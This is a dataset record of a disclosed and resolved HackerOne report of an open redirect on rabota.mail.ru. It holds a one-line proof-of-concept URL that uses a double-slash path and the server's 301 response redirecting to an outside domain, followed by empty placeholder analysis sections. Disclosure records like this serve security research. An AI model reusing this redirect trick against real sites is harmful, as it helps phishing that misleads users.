---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '87804'
original_report_id: '87804'
title: '[rabota.mail.ru] Open Redirect'
weakness: Open Redirect
team_handle: mailru
created_at: '2015-09-07T07:25:14.188Z'
disclosed_at: '2016-10-03T11:57:09.459Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 7
tags:
- hackerone
- open-redirect
---

# [rabota.mail.ru] Open Redirect

## Metadata

- HackerOne Report ID: 87804
- Weakness: Open Redirect
- Program: mailru
- Disclosed At: 2016-10-03T11:57:09.459Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

PoC:
`http://rabota.mail.ru//blackfan.ru//`

HTTP Response:
```
HTTP/1.1 301 Moved Permanently
Server: nginx/1.7.10
Date: Mon, 07 Sep 2015 07:24:30 GMT
Content-Length: 0
Connection: keep-alive
Keep-Alive: timeout=60
Location: //blackfan.ru
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
